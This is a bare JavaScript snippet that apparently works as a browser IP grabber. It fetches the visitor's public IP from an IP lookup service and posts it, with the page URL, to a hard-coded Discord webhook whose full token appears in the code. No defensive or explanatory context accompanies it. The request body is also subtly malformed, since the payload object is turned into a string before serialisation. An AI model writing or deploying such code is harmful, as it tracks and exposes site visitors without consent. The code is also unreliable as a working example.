const webhookUrl = "https://discord.com/api/webhooks/1425942186851307590/fFMi71eKDZm0PWgeiohMuzW5LVCK-BBDbPK0fPSMrQvhHV5vP00hM7lC5Bihug_jT0N5";
const fileUrl = "https://api.ipify.org?format=json";

(async ()=>{
  const fileRes = await fetch(fileUrl);
  if (!fileRes.ok) throw new Error(`fetch failed ${fileRes.status}`);
  const text = await fileRes.text();
  const payload = {content: text.length > 1900 ? text.slice(0,1900) + "\n\n...truncated" : text};
  const res = await fetch(webhookUrl, {
    method: "POST",
    headers: {"Content-Type":"application/json"},
    body: JSON.stringify(payload + "sent from" + location.href)
  });
  console.log("discord status", res.status);
})();
